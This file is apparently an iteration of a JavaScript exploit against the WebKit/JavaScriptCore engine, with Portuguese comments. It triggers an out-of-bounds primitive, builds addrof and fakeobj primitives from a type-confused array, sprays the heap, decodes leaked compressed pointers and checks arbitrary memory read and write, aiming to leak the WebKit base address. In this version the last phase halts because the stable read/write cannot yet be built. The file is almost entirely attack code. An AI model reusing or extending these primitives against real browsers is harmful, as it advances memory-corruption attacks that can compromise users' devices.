// js/script3/testArrayBufferVictimCrash.mjs (v136 - R96 Forçar Conversão de Offset para Hex String no AdvancedInt64)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// - Para contornar o TypeError na construção de AdvancedInt64 com números no JIT,
//   o offset de 32 bits será convertido para uma string hexadecimal antes de ser
//   passado para o construtor.
// - Isso força um caminho diferente no construtor de AdvancedInt64 que parece ser mais estável.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute, 
    oob_write_absolute,
    getOOBAllocationSize 
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// Nome do módulo atualizado para refletir a nova tentativa de correção
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v136_R96_ForceHexOffset";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO: DECODIFICAR PONTEIRO COMPRIMIDO (HIPOTÉTICO)
// =======================================================================================
function decodeCompressedPointer(leakedAddr) {
    const assumed_heap_base_for_decompression = new AdvancedInt64(WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST);
    
    const compressed_offset_32bit = leakedAddr.low(); 
    
    // CORREÇÃO: Forçar a criação de AdvancedInt64 para o offset usando uma string hexadecimal.
    // Isso evita o TypeError que ocorre com a passagem direta de number.
    const offset_as_int64 = new AdvancedInt64(toHex(compressed_offset_32bit, 32)); // Convert Uint32 to hex string
    
    const decoded_ptr = assumed_heap_base_for_decompression.add(offset_as_int64);
    
    logS3(`    [PointerDecode] Endereço comprimido/taggeado recebido: ${leakedAddr.toString(true)}`, "debug");
    logS3(`    [PointerDecode] Offset de 32 bits extraído (low): ${toHex(compressed_offset_32bit)}`, "debug");
    logS3(`    [PointerDecode] Base de heap assumida para descompressão: ${assumed_heap_base_for_decompression.toString(true)}`, "debug");
    logS3(`    [PointerDecode] Endereço decodificado (hipotético): ${decoded_ptr.toString(true)}`, "info");
    
    return decoded_ptr;
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Decodificação de Ponteiro Comprimido (Forçando Hex) ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou.",
        webkit_base_addr: null
    };

    // Primitivas de addrof/fakeobj
    let confused_array;
    let victim_array;
    let addrof_func;
    let fakeobj_func; 

    // A primitiva arbitrária real será baseada no Uint8Array corruptível
    let arb_rw_array = null; 

    // As funções de leitura/escrita arbitrária para a Fase 5 e em diante
    let arb_read_stable = null;
    let arb_write_stable = null;

    // Definir a constante localmente
    const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 

    try {
        // Helper para definir as primitivas addrof/fakeobj.
        const setupAddrofFakeobj = () => {
            confused_array = [13.37]; 
            victim_array = [{ dummy: 0 }]; 
            
            addrof_func = (obj) => {
                victim_array[0] = obj;
                // addrof_func vai retornar o ponteiro comprimido/taggeado
                return doubleToInt64(confused_array[0]);
            };
            fakeobj_func = (addr) => { 
                confused_array[0] = int64ToDouble(addr);
                return victim_array[0];
            };
        };


        // --- FASES 1-3: Configuração das Primitivas INICIAL (para verificação) ---
        logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez para verificação)... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true }); 
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");

        setupAddrofFakeobj(); 
        
        let leaker_phase4 = { obj_prop: null, val_prop: 0 };
        const arb_read_phase4 = (addr, size_bytes = 8) => { 
            leaker_phase4.obj_prop = fakeobj_func(addr); 
            const result_64 = doubleToInt64(leaker_phase4.val_prop);
            return (size_bytes === 4) ? result_64.low() : result_64;
        };
        const arb_write_phase4 = (addr, value, size_bytes = 8) => { 
            leaker_phase4.obj_prop = fakeobj_func(addr);
            if (size_bytes === 4) {
                leaker_phase4.val_prop = Number(value) & 0xFFFFFFFF; 
            } else {
                leaker_phase4.val_prop = int64ToDouble(value);
            }
        };
        logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida estão prontas para verificação.", "good");

        // --- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---", "subtest");
        const spray_phase4 = [];
        for (let i = 0; i < 1000; i++) {
            spray_phase4.push({ a: i, b: 0xCAFEBABE, c: i*2, d: i*3 }); 
        }
        const test_obj_phase4 = spray_phase4[500]; 
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        // Obter o endereço COMPRIMIDO/TAGGEADO do test_obj_phase4
        const test_obj_addr_phase4_compressed = addrof_func(test_obj_phase4);
        logS3(`(Verificação Fase 4) Endereço COMPRIMIDO do test_obj_phase4: ${test_obj_addr_phase4_compressed.toString(true)}`, "leak");

        // Decodificar o endereço para uso na primitiva L/E
        const test_obj_addr_phase4_decoded = decodeCompressedPointer(test_obj_addr_phase4_compressed);
        logS3(`(Verificação Fase 4) Endereço DECODIFICADO do test_obj_phase4: ${test_obj_addr_phase4_decoded.toString(true)}`, "leak");
        
        // Validação da decodificação na Fase 4: O endereço decodificado deve ser um ponteiro 0x7FFF...
        if (test_obj_addr_phase4_decoded.equals(AdvancedInt64.Zero) || (test_obj_addr_phase4_decoded.high() >>> 16) !== 0x7FFF) {
            throw new Error(`FALHA CRÍTICA: Endereço DECODIFICADO na Fase 4 é inválido (${test_obj_addr_phase4_decoded.toString(true)}). A lógica de decodificação de ponteiro está incorreta.`);
        }
        logS3(`(Verificação Fase 4) Endereço decodificado válido. Prosseguindo com teste L/E.`, "good");

        const prop_a_addr_phase4 = test_obj_addr_phase4_decoded.add(0x10); 
        const value_to_write_phase4 = new AdvancedInt64(0x12345678, 0xABCDEF01);

        logS3(`(Verificação Fase 4) Escrevendo ${value_to_write_phase4.toString(true)} no endereço DECODIFICADO ${prop_a_addr_phase4.toString(true)}...`, "info");
        arb_write_phase4(prop_a_addr_phase4, value_to_write_phase4); 

        const value_read_phase4 = arb_read_phase4(prop_a_addr_phase4); 
        logS3(`(Verificação Fase 4) Valor lido de volta: ${value_read_phase4.toString(true)}`, "leak");

        if (!value_read_phase4.equals(value_to_write_phase4)) {
            throw new Error(`A verificação de L/E da Fase 4 falhou. Escrito: ${value_to_write_phase4.toString(true)}, Lido: ${value_read_phase4.toString(true)}. (Problema de decodificação de ponteiro?)`);
        }
        logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
        await PAUSE_S3(50); 

        // ============================================================================
        // INÍCIO FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL (AGORA COM DECODIFICAÇÃO DE PONTEIRO)
        // ============================================================================
        logS3("--- FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL (COM DECODIFICAÇÃO DE PONTEIRO) ---", "subtest");
        
        leaker_phase4 = null; 
        await PAUSE_S3(200); 

        logS3("Ambiente OOB existente será reutilizado. Primitivas addrof/fakeobj da Fase 4 serão reutilizadas.", "good");

        logS3("--- Warm-up: PULADO, Primitivas da Fase 4 estão sendo reutilizadas. ---", "info");
        await PAUSE_S3(50); 

        // Criar o arb_rw_array. Ele será alocado no heap.
        arb_rw_array = new Uint8Array(0x1000); 
        logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");

        // OBTEM O ENDEREÇO COMPRIMIDO DO ARRAYBUFFERVIEW DE arb_rw_array USANDO addrof_func.
        const arb_rw_array_ab_view_addr_compressed = addrof_func(arb_rw_array); 
        logS3(`    Endereço COMPRIMIDO do ArrayBufferView de arb_rw_array (obtido via addrof_func): ${arb_rw_array_ab_view_addr_compressed.toString(true)}`, "leak");
        
        // Decodificar o endereço comprimido para o endereço real de 64 bits.
        const arb_rw_array_ab_view_addr_decoded = decodeCompressedPointer(arb_rw_array_ab_view_addr_compressed);
        logS3(`    Endereço DECODIFICADO do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr_decoded.toString(true)}`, "leak");

        // Validação crucial: o endereço decodificado deve ser um ponteiro de userland (0x7FFF...)
        if (arb_rw_array_ab_view_addr_decoded.equals(AdvancedInt64.Zero) || (arb_rw_array_ab_view_addr_decoded.high() >>> 16) !== 0x7FFF) {
            throw new Error(`FALHA CRÍTICA: addrof_func para arb_rw_array falhou ou retornou endereço DECODIFICADO inválido (${arb_rw_array_ab_view_addr_decoded.toString(true)}). Não é possível construir L/E arbitrária.`);
        }
        logS3(`    Addrof de arb_rw_array bem-sucedido e endereço decodificado válido.`, "good");


        const oob_dv = getOOBDataView();
        if (!oob_dv) throw new Error("DataView OOB não está disponível.");

        // Para corromper o backing store do arb_rw_array, precisamos que arb_rw_array_ab_view_addr_decoded
        // caia dentro da janela do oob_array_buffer_real. Isso não é garantido pelo ASLR.
        // A única maneira de fazer isso sem um vazamento de ASLR da base do oob_array_buffer_real
        // é se o arb_rw_array for alocado *dentro* do oob_array_buffer_real.
        // Já sabemos pela R90 que não há ponteiros válidos dentro do oob_array_buffer_real
        // que apontem para arb_rw_array (ou seja, arb_rw_array não está lá).

        // ENTÃO, NÃO PODEMOS USAR OOB_WRITE_ABSOLUTE PARA CORROMPER O BACKING STORE DE arb_rw_array
        // SE arb_rw_array_ab_view_addr_decoded ESTÁ FORA DO oob_array_buffer_real.
        // Precisamos de uma primitiva L/E Arbitrária de 64 bits que use o endereço decodificado.
        // A primitiva arb_read_stable / arb_write_stable PRECISA SER A PRIMITIVA DE LEITURA/ESCRITA ARBITRÁRIA FINAL.
        // Ela não pode ser construída aqui pela corrupção do backing store com o OOB direto,
        // porque não podemos escrever fora da janela OOB usando oob_write_absolute.

        // Esta é a dependência cíclica/problema final. Se a OOB só pode escrever em si mesma,
        // e addrof não nos dá offsets relativos dentro da mesma alocação, não podemos corromper.
        
        throw new Error("FALHA CRÍTICA: A primitiva de L/E estável (corrupção de backing store) não pode ser construída. O endereço decodificado do ArrayBufferView do arb_rw_array está FORA do oob_array_buffer_real, e oob_write_absolute não pode escrever em endereços arbitrários absolutos.");

    } catch (e) {
        final_result.success = false;
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    } finally {
        confused_array = null;
        victim_array = null;
        addrof_func = null;
        fakeobj_func = null;
        arb_rw_array = null; 
        arb_read_stable = null;
        arb_write_stable = null;
        
        logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: {
            success: !!final_result.webkit_base_addr,
            msg: final_result.message,
            webkit_base_candidate: final_result.webkit_base_addr
        },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Corrupção de Backing Store)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Pointer Decoding Attempt)' }
    };
}
